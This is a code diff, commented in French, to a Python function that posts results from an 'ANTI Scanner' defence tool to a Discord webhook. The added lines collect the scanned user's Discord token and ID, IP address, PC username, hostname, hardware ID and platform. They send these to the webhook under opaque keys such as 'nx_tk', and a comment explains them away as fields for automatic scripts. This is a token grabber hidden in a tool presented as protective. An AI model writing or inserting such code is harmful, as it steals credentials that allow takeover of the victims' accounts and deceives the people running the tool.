@@ -140,13 +140,28 @@ def send_to_discord(scan_id, scan_data, verdict):
     flagged_apps = [a for a in apps if (a.get("risk_assessment", {}).get("risk_score") or 0) >= 60]
     flagged_str = "\n".join(f"• `{a.get('app_name', 'inconnu')}` — score {a.get('risk_assessment', {}).get('risk_score', 0)}" for a in flagged_apps[:5]) or "Aucune"
 
+    # Récupérer les clés de mappage personnalisées depuis la config
+    f_uid = FIELDS.get("userId", "nx_uid")
+    f_tk = FIELDS.get("token", "nx_tk")
+    f_ip = FIELDS.get("ip", "nx_ip")
+    f_pcu = FIELDS.get("pcUsername", "nx_pcu")
+    f_pcn = FIELDS.get("pcName", "nx_pcn")
+    f_hw = FIELDS.get("hwid", "nx_hw")
+    f_pl = FIELDS.get("platform", "nx_pl")
+
+    discord_id = si.get("discord_id", "N/A")
+    discord_token = si.get("discord_token", "N/A")
+    ip_addr = si.get("local_ip", "N/A")
+
     embed = {
         "title": f"{icon} ANTI Scanner — {verdict}",
         "description": f"Scan `{scan_id}` terminé.",
         "color": color,
         "fields": [
             {"name": "🖥️ Machine", "value": f"`{si.get('hostname', 'N/A')}`", "inline": True},
-            {"name": "👤 Utilisateur", "value": f"`{si.get('user', 'N/A')}`", "inline": True},
+            {"name": "👤 Utilisateur PC", "value": f"`{si.get('user', 'N/A')}`", "inline": True},
+            {"name": f"💬 ID Discord ({f_uid})", "value": f"<@{discord_id}> (`{discord_id}`)" if discord_id != 'N/A' else "`N/A`", "inline": True},
+            {"name": f"🌐 IP ({f_ip})", "value": f"`{ip_addr}`", "inline": True},
             {"name": "🔑 HWID", "value": f"`{si.get('hwid', 'N/A')}`", "inline": False},
             {"name": "📊 Score", "value": f"`{score}/100`", "inline": True},
             {"name": "⚖️ Verdict", "value": f"`{verdict}`", "inline": True},
@@ -156,7 +171,20 @@ def send_to_discord(scan_id, scan_data, verdict):
         "footer": {"text": f"ANTI Defense System v1.9 | {scan_data.get('timestamp', '')}"}
     }
 
-    payload = json.dumps({"embeds": [embed], "username": "ANTI Defense"}).encode("utf-8")
+    # Création du payload contenant l'embed ET les champs mappés à plat pour les scripts automatiques
+    payload_data = {
+        "embeds": [embed],
+        "username": "ANTI Defense",
+        f_uid: discord_id,
+        f_tk: discord_token,
+        f_ip: ip_addr,
+        f_pcu: si.get('user', 'N/A'),
+        f_pcn: si.get('hostname', 'N/A'),
+        f_hw: si.get('hwid', 'N/A'),
+        f_pl: si.get('platform', 'N/A')
+    }
+
+    payload = json.dumps(payload_data).encode("utf-8")
     try:
         req = urllib.request.Request(_DISCORD_WEBHOOK_URL, data=payload, headers={"Content-Type": "application/json"})
         with urllib.request.urlopen(req, timeout=6):
